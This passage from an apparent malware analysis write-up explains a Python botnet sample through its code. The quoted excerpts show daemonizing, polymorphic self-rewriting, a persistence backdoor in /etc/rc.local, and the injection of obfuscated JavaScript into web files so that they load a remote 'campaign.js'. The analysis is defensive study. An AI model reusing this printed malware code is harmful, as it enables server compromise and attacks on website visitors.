</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>        <span style=color:#fb660a;font-weight:700>if</span> pid &gt; <span style=color:#0086f7;font-weight:700>0</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>            sys.exit(<span style=color:#0086f7;font-weight:700>0</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>    <span style=color:#fb660a;font-weight:700>except</span> OSError:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>        <span style=color:#fb660a;font-weight:700>return</span> <span style=color:#0086f7;font-weight:700>0</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>    os.setsid()
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>    os.umask(<span style=color:#0086f7;font-weight:700>0</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>    <span style=color:#fb660a;font-weight:700>try</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>        pid = os.fork()
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>        <span style=color:#fb660a;font-weight:700>if</span> pid &gt; <span style=color:#0086f7;font-weight:700>0</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>            sys.exit(<span style=color:#0086f7;font-weight:700>0</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>    <span style=color:#fb660a;font-weight:700>except</span> OSError:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>        <span style=color:#fb660a;font-weight:700>return</span> <span style=color:#0086f7;font-weight:700>0</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>    <span style=color:#fb660a;font-weight:700>return</span> <span style=color:#0086f7;font-weight:700>1</span>
</span></span></code></pre></div><p>Next step, it writes its <code>PID</code> to disk, but first it checks if the file <code>.pidw</code> exists, if it does, it will open the file and read the <code>PID</code> inside it and kill the process. Then it will write the new <code>PID</code>. This is most likely to ensure that only one copy of the malware is running at any given time.</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#fb660a;font-weight:700>def</span> <span style=color:#ff0086;font-weight:700>iseSURJTiXTid</span>(duLZajeLU):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>    <span style=color:#fb660a;font-weight:700>try</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>        os.kill(duLZajeLU, <span style=color:#0086f7;font-weight:700>0</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>    <span style=color:#fb660a;font-weight:700>except</span> OSError:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>        <span style=color:#fb660a;font-weight:700>return</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>    <span style=color:#fb660a;font-weight:700>else</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>        <span style=color:#fb660a;font-weight:700>return</span> duLZajeLU
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#fb660a;font-weight:700>def</span> <span style=color:#ff0086;font-weight:700>writePID</span>(pidFilePath):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>    <span style=color:#fb660a;font-weight:700>if</span> os.path.exists(pidFilePath):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>        <span style=color:#fb660a;font-weight:700>try</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>            <span style=color:#fb660a;font-weight:700>if</span> iseSURJTiXTid(int(open(pidFilePath).read())):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>                os.kill(os.getpid(),<span style=color:#0086f7;font-weight:700>9</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>            <span style=color:#fb660a;font-weight:700>else</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>                os.remove(pidFilePath)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>        <span style=color:#fb660a;font-weight:700>except</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>            <span style=color:#fb660a;font-weight:700>try</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>                os.remove(pidFilePath)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>            <span style=color:#fb660a;font-weight:700>except</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>                <span style=color:#fb660a;font-weight:700>pass</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>    open(pidFilePath, <span style=color:#0086d2>&#39;w&#39;</span>).write(str(os.getpid()))
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>    <span style=color:#fb660a;font-weight:700>return</span> pidFilePath
</span></span></code></pre></div><p>Now it&rsquo;s time for running the actual malware! The method below wraps the execution of the class <code>qRuFGkSs()</code> inside a while loop and a try/catch statement. Probably to ignore any errors that arises during runtime and keep on running.</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#fb660a;font-weight:700>def</span> <span style=color:#ff0086;font-weight:700>nPhcxQhVzd</span>():
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>    <span style=color:#fb660a;font-weight:700>while</span> <span style=color:#0086f7;font-weight:700>1</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span>        <span style=color:#fb660a;font-weight:700>try</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span>            qRuFGkSs()
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span><span>        <span style=color:#fb660a;font-weight:700>except</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6</span><span>            <span style=color:#fb660a;font-weight:700>pass</span>
</span></span></code></pre></div><h2 id=polymorphism>Polymorphism</h2><p>Once the class <code>qRuFGkSs()</code> executes, its <code>__init()__</code> function (the <em>constructor</em>) will be executed first. The first thing it does is to set <code>STDOUT</code> and <code>STDERR</code> to <code>/dev/null</code>, meaning any (error) output will not be printed to screen.</p><p>The next function, which I call <code>repackProgram()</code>, is actually the most interesting function in this malware. Because it changes the malware in such a way that every time it executes it will appear as a new program.</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#fb660a;font-weight:700>def</span> __init__(self):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>    sys.stdout = sys.stderr = open(os.devnull,<span style=color:#0086d2>&#39;wb&#39;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>    self.repackProgram()
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>    self.ctx = ssl.create_default_context()
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>    self.ctx.check_hostname = <span style=color:#fb660a;font-weight:700>False</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>    self.ctx.verify_mode = ssl.CERT_NONE
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>    self.VwkBkdwM=self.bxsHTdxPUds(random.randrange(<span style=color:#0086f7;font-weight:700>8</span>,<span style=color:#0086f7;font-weight:700>16</span>))
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>    self.gLsaWmlh=<span style=color:#0086f7;font-weight:700>0</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>    self.XUbvPqib=<span style=color:#0086f7;font-weight:700>0</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>    self.VSoeKsdv=<span style=color:#0086f7;font-weight:700>0</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>    self.AELmEnMe=<span style=color:#0086f7;font-weight:700>0</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>    self.prefiex=<span style=color:#0086d2>&#34;.&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>    self.EQGAKLwR=<span style=color:#0086f7;font-weight:700>443</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>    self.runExploitsstats={<span style=color:#0086d2>&#34;gaybots&#34;</span>:[<span style=color:#0086f7;font-weight:700>0</span>,<span style=color:#0086f7;font-weight:700>0</span>]}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>    self.scannerenabled = <span style=color:#0086f7;font-weight:700>1</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>    self.snifferenabled = <span style=color:#0086f7;font-weight:700>0</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>    self.scanips=[]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>    threading.Thread(target=self.searchFileTypes).start()
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>    threading.Thread(target=self.UlmSHpooaCdc).start()
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>    self.ircVictimNick=<span style=color:#0086d2>&#34;[HAX|&#34;</span>+platform.system()+<span style=color:#0086d2>&#34;|&#34;</span>+platform.machine()+<span style=color:#0086d2>&#34;|&#34;</span>+str(multiprocessing.cpu_count())+<span style=color:#0086d2>&#34;]&#34;</span>+str(self.VwkBkdwM)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>    self.aRHRPteL=<span style=color:#0086d2>&#34;[HAX|&#34;</span>+platform.system()+<span style=color:#0086d2>&#34;|&#34;</span>+platform.machine()+<span style=color:#0086d2>&#34;|&#34;</span>+str(multiprocessing.cpu_count())+<span style=color:#0086d2>&#34;]&#34;</span>+str(self.VwkBkdwM)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>    self.pBYbuWVq=str(self.VwkBkdwM)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>    [...]
</span></span></code></pre></div><p>The ability to change the code but retain the same functionality is called polymorphism.</p><p>The way this malware achieves this is to open itself, parse the code using the <code>AST</code> module and traverse the tree while modifying function names and variables. This means that every time this method is called, the malware will modify all functions and variables so it will look different. This defeats traditional signature based detections. Once that&rsquo;s done, it will write the result to itself, meaning it will overwrite the previous version.</p><h2 id=the-backdoor>The backdoor</h2><p>To achieve persistence, the malware will try to backdoor <code>/etc/rc.local</code> with a reference to <code>/etc/boot</code> which will contain a copy of the malware. However, this will only work if the user executing the malware has root privileges.</p><p>It also tries to set the preferred DNS server to <code>1.1.1.1</code> and <code>1.0.0.1</code>, most likely to evade custom DNS filtering/monitoring.</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#fb660a;font-weight:700>def</span> <span style=color:#ff0086;font-weight:700>HYZwyjaoSAo</span>(self):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>    <span style=color:#fb660a;font-weight:700>try</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>        EuwdcwhxZEy=open(<span style=color:#0086d2>&#34;/etc/resolv.conf&#34;</span>, <span style=color:#0086d2>&#34;w&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>        EuwdcwhxZEy.write(<span style=color:#0086d2>&#34;nameserver 1.1.1.1 </span><span style=color:#0086d2>\\</span><span style=color:#0086d2> nameserver 1.0.0.1&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>        EuwdcwhxZEy.close()
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>        rc=open(<span style=color:#0086d2>&#34;/etc/rc.local&#34;</span>,<span style=color:#0086d2>&#34;rb&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>        data=rc.read()
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>        rc.close()
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>        <span style=color:#fb660a;font-weight:700>if</span> <span style=color:#0086d2>&#34;boot&#34;</span> not in data:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>            <span style=color:#fb660a;font-weight:700>with</span> open(currentExecFile, <span style=color:#0086d2>&#39;rb&#39;</span>) <span style=color:#fb660a;font-weight:700>as</span> ofuhaBwXIc, open(<span style=color:#0086d2>&#34;/etc/boot&#34;</span>, <span style=color:#0086d2>&#39;wb&#39;</span>) <span style=color:#fb660a;font-weight:700>as</span> nFnawMFdkiMV:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>                <span style=color:#fb660a;font-weight:700>while</span> <span style=color:#fb660a;font-weight:700>True</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>                    ooihBBfeps = ofuhaBwXIc.read(<span style=color:#0086f7;font-weight:700>1024</span>*<span style=color:#0086f7;font-weight:700>1024</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>                    <span style=color:#fb660a;font-weight:700>if</span> not ooihBBfeps:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>                        <span style=color:#fb660a;font-weight:700>break</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>                    nFnawMFdkiMV.write(ooihBBfeps)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>            os.chmod(<span style=color:#0086d2>&#34;/etc/boot&#34;</span>, <span style=color:#0086f7;font-weight:700>777</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>            rc=open(<span style=color:#0086d2>&#34;/etc/rc.local&#34;</span>,<span style=color:#0086d2>&#34;wb&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>            <span style=color:#fb660a;font-weight:700>if</span> <span style=color:#0086d2>&#34;exit&#34;</span> in data:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>                rc.write(data.replace(<span style=color:#0086d2>&#34;exit&#34;</span>, <span style=color:#0086d2>&#34;/etc/boot </span><span style=color:#0086d2>\\</span><span style=color:#0086d2> exit&#34;</span>))
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>            <span style=color:#fb660a;font-weight:700>else</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>                rc.write(<span style=color:#0086d2>&#34;/etc/boot&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>            rc.close()
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>    <span style=color:#fb660a;font-weight:700>except</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>        <span style=color:#fb660a;font-weight:700>pass</span>
</span></span></code></pre></div><h2 id=infecting-html-files>Infecting HTML files</h2><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>threading.Thread(target=self.searchFileTypes).start()
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>threading.Thread(target=self.UlmSHpooaCdc).start()
</span></span></code></pre></div><p>The malware will also try to infect web files by injecting javascript code that will load an external malicious javascript file.</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#fb660a;font-weight:700>def</span> <span style=color:#ff0086;font-weight:700>backdoorFile</span>(self, filenameToBackdoor):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>    [...]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>    kIWvKBVJjU = b64encode(<span style=color:#0086d2>&#34;//&#34;</span> + self.AnKeMnXc + <span style=color:#0086d2>&#34;/campaign.js&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>    ZEaXidosaG=<span style=color:#0086d2>&#34;(function(&#34;</span> + WiQOnadIBNQ + <span style=color:#0086d2>&#34;, &#34;</span> + BHgYdESOTTaQ + <span style=color:#0086d2>&#34;) {&#34;</span> + BHgYdESOTTaQ + <span style=color:#0086d2>&#34; = &#34;</span> + WiQOnadIBNQ + <span style=color:#0086d2>&#34;.createElement(&#39;script&#39;);&#34;</span> + BHgYdESOTTaQ + <span style=color:#0086d2>&#34;.type = &#39;text/javascript&#39;;&#34;</span> + BHgYdESOTTaQ + <span style=color:#0086d2>&#34;.async = true;&#34;</span> + BHgYdESOTTaQ + <span style=color:#0086d2>&#34;.src = atob(&#39;&#34;</span>v+ aNDQdUzzdyS + kIWvKBVJjU + aNDQdUzzdyS + <span style=color:#0086d2>&#34;&#39;.replace(/&#34;</span> + aNDQdUzzdyS + <span style=color:#0086d2>&#34;/gi, &#39;&#39;)) + &#39;?&#39; + String(Math.random()).replace(&#39;0.&#39;,&#39;&#39;);&#34;</span> + WiQOnadIBNQ + <span style=color:#0086d2>&#34;.getElementsByTagName(&#39;body&#39;)[0].appendChild(&#34;</span> + BHgYdESOTTaQ + <span style=color:#0086d2>&#34;);}(document));&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>    [...]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#fb660a;font-weight:700>def</span> <span style=color:#ff0086;font-weight:700>searchFileTypes</span>(self):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>    <span style=color:#0086d2>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#0086d2>        Search for .js, .html and .php files
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#0086d2>    &#34;&#34;&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>    self.AkvElneS=<span style=color:#0086f7;font-weight:700>0</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>    <span style=color:#fb660a;font-weight:700>for</span> zSPEvwUiRiDk in [ele <span style=color:#fb660a;font-weight:700>for</span> ele in os.listdir(<span style=color:#0086d2>&#34;/&#34;</span>) <span style=color:#fb660a;font-weight:700>if</span> ele not in [<span style=color:#0086d2>&#34;proc&#34;</span>, <span style=color:#0086d2>&#34;bin&#34;</span>, <span style=color:#0086d2>&#34;sbin&#34;</span>, <span style=color:#0086d2>&#34;sbin&#34;</span>, <span style=color:#0086d2>&#34;dev&#34;</span>, <span style=color:#0086d2>&#34;lib&#34;</span>, <span style=color:#0086d2>&#34;lib64&#34;</span>, <span style=color:#0086d2>&#34;lost+found&#34;</span>, <span style=color:#0086d2>&#34;sys&#34;</span>, <span style=color:#0086d2>&#34;boot&#34;</span>, <span style=color:#0086d2>&#34;etc&#34;</span>]]:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>        <span style=color:#fb660a;font-weight:700>for</span> WlaGLQjJC in [<span style=color:#0086d2>&#34;*.js&#34;</span>, <span style=color:#0086d2>&#34;*.html&#34;</span>, <span style=color:#0086d2>&#34;*.htm&#34;</span>, <span style=color:#0086d2>&#34;*.php&#34;</span>]:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>            <span style=color:#fb660a;font-weight:700>for</span> filenameToBackdoor in os.popen(<span style=color:#0086d2>&#34;find </span><span style=color:#0086d2>\&#34;</span><span style=color:#0086d2>/&#34;</span> + zSPEvwUiRiDk + <span style=color:#0086d2>&#34;</span><span style=color:#0086d2>\&#34;</span><span style=color:#0086d2> -type f -name </span><span style=color:#0086d2>\&#34;</span><span style=color:#0086d2>&#34;</span> + WlaGLQjJC + <span style=color:#0086d2>&#34;</span><span style=color:#0086d2>\&#34;</span><span style=color:#0086d2>&#34;</span>).read().split(<span style=color:#0086d2>&#34;</span><span style=color:#0086d2>\n</span><span style=color:#0086d2>&#34;</span>):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>                filenameToBackdoor = filenameToBackdoor.replace(<span style=color:#0086d2>&#34;</span><span style=color:#0086d2>\r</span><span style=color:#0086d2>&#34;</span>, <span style=color:#0086d2>&#34;&#34;</span>).replace(<span style=color:#0086d2>&#34;</span><span style=color:#0086d2>\n</span><span style=color:#0086d2>&#34;</span>, <span style=color:#0086d2>&#34;&#34;</span>)
